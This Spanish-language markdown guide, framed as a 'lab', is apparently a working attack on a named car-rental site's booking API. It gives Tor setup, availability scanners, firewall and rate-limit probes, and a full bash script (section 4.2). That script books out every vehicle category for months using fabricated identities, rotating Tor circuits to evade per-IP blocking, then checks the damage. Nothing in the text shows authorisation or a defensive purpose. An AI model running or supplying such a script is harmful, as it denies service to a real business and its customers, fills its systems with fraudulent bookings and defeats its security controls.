# 🐉 Laboratorio Kali + Tor: Ataque DoS Lógico a Ocean Drive

## Requisitos Previos
```bash
# En Kali Linux (o cualquier Linux con apt)
sudo apt update && sudo apt install -y tor curl jq php-cli

# Iniciar Tor y habilitar el control port
sudo bash -c 'echo "ControlPort 9051" >> /etc/tor/torrc'
sudo bash -c 'echo "CookieAuthentication 0" >> /etc/tor/torrc'
sudo systemctl restart tor
sudo systemctl status tor  # Verificar que está activo
```

**Variable global (ejecutar siempre primero):**
```bash
export TARGET="https://oceandrivecarental.com/server/public"
export TOR="socks5h://127.0.0.1:9050"
export UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

---

## 1️⃣ RECONOCIMIENTO

### 1.1 Verificar que Tor funciona
```bash
echo "Mi IP real:"; curl -s https://api.ipify.org; echo ""
echo "Mi IP via Tor:"; curl -s -x $TOR https://api.ipify.org; echo ""
```

### 1.2 Inspección de Vehículos (Catálogo completo)
```bash
curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/vehicles" | jq '.[] | {id, name, stock, base_price, transmission}'
```

### 1.3 Verificar disponibilidad de una fecha específica
```bash
# Cambiar FECHA según necesidad
FECHA="2026-04-21"
MANANA=$(date -d "$FECHA +1 day" +%Y-%m-%d)
curl -s -x $TOR -H "User-Agent: $UA" \
    "$TARGET/bookings/availability?start_date=$FECHA&end_date=$MANANA&pickup_time=12:30&dropoff_time=10:00" | jq '.'
```

---

## 2️⃣ SCANNER DE DISPONIBILIDAD (Emojis)

### 2.1 Scanner Abril
```bash
echo "=== 🔍 SCANNER ABRIL 2026 ==="
echo "FECHA      | ECON | COMP | COMP+| SUV  | SUV+"
echo "-----------|------|------|------|------|------"
for i in $(seq 18 30); do
    F="2026-04-$i"; M="2026-04-$((i+1))"
    [ $i -eq 30 ] && M="2026-05-01"
    R=$(curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/bookings/availability?start_date=$F&end_date=$M&pickup_time=12:30&dropoff_time=10:00")
    S=$(echo "$R" | jq -r 'def c(id): (map(select(.id==id))|.[0].is_available); "\(if c(1) then " ✅ " else " ❌ " end)|\(if c(2) then " ✅ " else " ❌ " end)|\(if c(3) then " ✅ " else " ❌ " end)|\(if c(4) then " ✅ " else " ❌ " end)|\(if c(5) then " ⚠️ " else " ❌ " end)"')
    echo "$F |$S"
    sleep 0.3
done
```

### 2.2 Scanner Mayo-Junio
```bash
echo "=== 🔍 SCANNER MAYO-JUNIO 2026 ==="
echo "FECHA      | ECON | COMP | COMP+| SUV  | SUV+"
echo "-----------|------|------|------|------|------"
for i in $(seq 0 60); do
    F=$(date -d "2026-05-01 +$i days" +%Y-%m-%d)
    M=$(date -d "2026-05-01 +$((i+1)) days" +%Y-%m-%d)
    R=$(curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/bookings/availability?start_date=$F&end_date=$M&pickup_time=12:30&dropoff_time=10:00")
    S=$(echo "$R" | jq -r 'def c(id): (map(select(.id==id))|.[0].is_available); "\(if c(1) then " ✅ " else " ❌ " end)|\(if c(2) then " ✅ " else " ❌ " end)|\(if c(3) then " ✅ " else " ❌ " end)|\(if c(4) then " ✅ " else " ❌ " end)|\(if c(5) then " ⚠️ " else " ❌ " end)"')
    echo "$F |$S"
    sleep 0.3
done
```

---

## 3️⃣ DIAGNÓSTICO WAF

### 3.1 Sonda rápida (Identificar reglas del defensor)
```bash
echo "─── TEST A: Sin Tor (IP real) ───"
printf '{"category_id":1,"start_date":"2026-06-20","end_date":"2026-06-21","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"Carlos Prueba","email":"carlos.prueba@gmail.com","phone":"+573151234567","nationality":"Colombia","doc_type":"CC","doc_number":"79854123"}}' > /tmp/test.json
echo -n "HTTP: "; curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/bookings" -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Origin: https://oceandrivecarental.com" -d @/tmp/test.json
echo ""
sleep 2

echo "─── TEST B: Con Tor + datos reales ───"
printf '{"category_id":1,"start_date":"2026-06-21","end_date":"2026-06-22","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"María López","email":"maria.lopez.test@hotmail.com","phone":"+573187654321","nationality":"Colombia","doc_type":"CC","doc_number":"52148796"}}' > /tmp/test.json
echo -n "HTTP: "; curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/bookings" -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Origin: https://oceandrivecarental.com" -H "Referer: https://oceandrivecarental.com/reservar" -x $TOR -d @/tmp/test.json
echo ""; rm /tmp/test.json

echo ""
echo "Si A=403 y B=201 → WAF banea tu IP real. Tor lo evade ✅"
echo "Si ambos 403     → WAF bloquea todo. Revisar headers/timing."
echo "Si B=201          → ¡Funciona! Proceder al ataque."
```

### 3.2 Test de Rate Limit (¿Cuántas permite por IP?)
```bash
echo "Probando rate limit del WAF..."
for i in $(seq 1 8); do
    printf '{"category_id":1,"start_date":"2026-07-%02d","end_date":"2026-07-%02d","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"Test User %d","email":"test%d@gmail.com","phone":"+5731500000%d","nationality":"Colombia","doc_type":"CC","doc_number":"%d"}}' $i $((i+1)) $i $i $i $((10000000+i)) > /tmp/test.json
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -x $TOR -X POST "$TARGET/bookings" -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Origin: https://oceandrivecarental.com" -H "Referer: https://oceandrivecarental.com/reservar" -d @/tmp/test.json)
    echo "Petición #$i → HTTP $CODE"
    sleep 1
done
rm /tmp/test.json
echo "→ El número donde cambia de 201 a 403/429 = límite por IP"
```

---

## 4️⃣ ATAQUE: Operación Asimétrica con Tor

### 4.1 Función para rotar IP de Tor
```bash
# Obtener nueva IP (nuevo circuito Tor)
rotar_tor() {
    echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' | nc -q 1 127.0.0.1 9051 > /dev/null 2>&1
    sleep 2  # Tor necesita ~2 seg para establecer nuevo circuito
}
```

### 4.2 Script de Ataque Completo
```bash
#!/bin/bash
# Función rotar Tor
rotar_tor() {
    echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' | nc -q 1 127.0.0.1 9051 > /dev/null 2>&1
    sleep 2
}

export TARGET="https://oceandrivecarental.com/server/public"
TOR="socks5h://127.0.0.1:9050"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
MAX_POR_IP=3

NOMBRES=("Andrés Felipe Martínez" "Carolina Mendoza Ruiz" "Juan David Herrera" "María Alejandra Torres" "Santiago López Giraldo" "Valentina Ospina Castro" "Camilo Restrepo" "Laura Daniela Vargas" "Sebastián Morales" "Natalia García" "Felipe Ramírez" "Daniela Mejía" "Julián Henao" "Isabela Cardona" "Mateo Muñoz")
DOMINIOS=("gmail.com" "hotmail.com" "outlook.com" "yahoo.com" "live.com")

echo "🚀 Ataque DoS Lógico via Tor — IP infinitas, gratis"
echo "📊 Rate limit WAF: $MAX_POR_IP por IP → Rotación automática de circuito Tor"
echo ""

TOTAL=0; OK=0; FAIL=0; CONT_IP=0

for cat in 1 2 3 4; do
    case $cat in
        1) BASE="2026-04-21"; DAYS=71; STOCK=1; TAG="ECONÓMICO" ;;
        2) BASE="2026-04-19"; DAYS=73; STOCK=2; TAG="COMPACTO" ;;
        3) BASE="2026-04-20"; DAYS=72; STOCK=3; TAG="COMPACTO+" ;;
        4) BASE="2026-04-18"; DAYS=74; STOCK=1; TAG="SUV" ;;
    esac

    echo "━━━ CAT $cat ($TAG) desde $BASE | $DAYS días | Stock: $STOCK ━━━"

    for ((d=0; d<DAYS; d++)); do
        START=$(date -d "$BASE +$d days" +%Y-%m-%d)
        END=$(date -d "$BASE +$((d+1)) days" +%Y-%m-%d)
        DIA_ID=$(date -d "$BASE +$d days" +%m%d)

        for ((u=1; u<=STOCK; u++)); do
            TOTAL=$((TOTAL+1))

            # 🔄 Rotar IP cada MAX_POR_IP reservas
            if [ $CONT_IP -ge $MAX_POR_IP ]; then
                echo -n "   🔄 Rotando circuito Tor... "
                rotar_tor
                IP_NUEVA=$(curl -s -x $TOR https://api.ipify.org)
                echo "Nueva IP: $IP_NUEVA"
                CONT_IP=0
            fi
            CONT_IP=$((CONT_IP+1))

            # 🎭 Generar identidad falsa realista
            NOMBRE="${NOMBRES[$RANDOM % ${#NOMBRES[@]}]}"
            DOM="${DOMINIOS[$RANDOM % ${#DOMINIOS[@]}]}"
            EMAIL_USER=$(echo "$NOMBRE" | tr '[:upper:]' '[:lower:]' | tr ' ' '.' | tr -d 'áéíóúñ' | cut -d. -f1-2)
            EMAIL="${EMAIL_USER}.${DIA_ID}@${DOM}"
            DOC=$((10000000 + RANDOM % 90000000))
            TEL="+5731$((1000000 + RANDOM % 9000000))"

            echo -n "[*] Cat:$cat $START (U$u) [$CONT_IP/$MAX_POR_IP] $NOMBRE... "

            printf '{"category_id":%d,"start_date":"%s","end_date":"%s","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"%s","email":"%s","phone":"%s","nationality":"Colombia","doc_type":"CC","doc_number":"%s"}}' \
                "$cat" "$START" "$END" "$NOMBRE" "$EMAIL" "$TEL" "$DOC" > /tmp/payload.json

            RESULT=$(curl -s -x $TOR \
                -X POST "$TARGET/bookings" \
                -H "Content-Type: application/json" \
                -H "User-Agent: $UA" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: es-CO,es;q=0.9" \
                -H "Origin: https://oceandrivecarental.com" \
                -H "Referer: https://oceandrivecarental.com/reservar" \
                -d @/tmp/payload.json)

            MSG=$(echo "$RESULT" | jq -r '.message // .error // "Sin respuesta"' 2>/dev/null)
            if echo "$MSG" | grep -qi "confirmed"; then
                echo "✅ CONFIRMADA"
                OK=$((OK+1))
            elif echo "$MSG" | grep -qi "Polic\|limit\|block"; then
                echo "🚫 IP quemada → Forzando rotación"
                CONT_IP=$MAX_POR_IP
                FAIL=$((FAIL+1))
            else
                echo "⚠️ $MSG"
                FAIL=$((FAIL+1))
            fi

            sleep $(( (RANDOM % 2) + 1 ))
        done
    done
done

rm -f /tmp/payload.json
echo ""
echo "══════════════════════════════════════"
echo "📊 RESULTADOS"
echo "══════════════════════════════════════"
echo "Total:    $TOTAL"
echo "✅ OK:    $OK"
echo "🚫 Fail:  $FAIL"
echo "Éxito:    $(( OK * 100 / (TOTAL > 0 ? TOTAL : 1) ))%"
```

---

## 5️⃣ VERIFICACIÓN POST-ATAQUE

### 5.1 Scanner rápido Abril
```bash
echo "FECHA      | ECON | COMP | COMP+| SUV  | SUV+"
echo "-----------|------|------|------|------|------"
for i in $(seq 18 30); do
    F="2026-04-$i"; M="2026-04-$((i+1))"; [ $i -eq 30 ] && M="2026-05-01"
    R=$(curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/bookings/availability?start_date=$F&end_date=$M&pickup_time=12:30&dropoff_time=10:00")
    S=$(echo "$R" | jq -r 'def c(id):(map(select(.id==id))|.[0].is_available); "\(if c(1) then " ✅ " else " ❌ " end)|\(if c(2) then " ✅ " else " ❌ " end)|\(if c(3) then " ✅ " else " ❌ " end)|\(if c(4) then " ✅ " else " ❌ " end)|\(if c(5) then " ⚠️ " else " ❌ " end)"')
    echo "$F |$S"
done
```

### 5.2 Extracción forense (ver las reservas fantasma creadas)
```bash
curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/vehicles" | jq '.[] | {id, name, stock}'
```

---

## 📋 Resumen de Comandos Rápidos

| Acción | Comando |
|--------|---------|
| Verificar Tor | `curl -s -x $TOR https://api.ipify.org` |
| Rotar IP | `echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' \| nc -q 1 127.0.0.1 9051` |
| Ver vehículos | `curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/vehicles" \| jq '.'` |
| Scanner fecha | Sección 2.1 / 2.2 |
| Diagnóstico WAF | Sección 3.1 |
| Ataque completo | Sección 4.2 (copiar a `.sh` y ejecutar con `bash`) |
| Verificar ataque | Sección 5.1 |
